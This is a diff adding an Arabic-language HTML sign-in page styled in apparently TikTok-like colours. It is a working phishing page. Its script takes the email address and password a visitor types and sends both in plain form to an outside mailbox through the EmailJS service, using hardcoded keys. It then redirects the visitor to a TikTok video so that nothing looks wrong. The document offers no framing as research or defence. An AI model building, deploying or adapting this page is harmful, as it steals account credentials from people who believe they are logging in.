@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        /* تنسيق عام */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #000; /* خلفية سوداء */
+            color: #fff; /* نص أبيض */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* حاوية تسجيل الدخول */
+        .login-container {
+            background-color: #121212; /* خلفية داكنة */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); /* ظل أحمر */
+            width: 350px;
+            text-align: center;
+        }
+
+        /* عنوان الصفحة */
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #fff;
+            font-size: 24px;
+        }
+
+        /* حقول الإدخال */
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #1e1e1e; /* خلفية داكنة للحقول */
+            color: #fff; /* نص أبيض */
+            font-size: 16px;
+        }
+
+        /* زر تسجيل الدخول */
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff0050; /* لون أحمر */
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-container button:hover {
+            background-color: #e6004c; /* لون أحمر داكن عند التمرير */
+        }
+    </style>
+    <!-- إضافة مكتبة EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // تهيئة EmailJS
+        (function() {
+            emailjs.init("T8dFFYK-nFxpuLbbv"); // User ID الخاص بك
+        })();
+    </script>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button onclick="submitForm()">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        function submitForm() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البيانات باستخدام EmailJS
+            emailjs.send("service_dl2pg3o", "template_ca3b0oj", {
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+                console.log("تم إرسال البريد الإلكتروني بنجاح!", response.status, response.text);
+
+                // تحويل المستخدم إلى الرابط المطلوب بعد إرسال البيانات
+                window.location.href = "https://www.tiktok.com/@islam_ma7/video/7448979700774407431";
+            }, function(error) {
+                console.error("فشل إرسال البريد الإلكتروني:", error);
+                alert("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
+            });
+        }
+    </script>
+
+</body>
+</html>
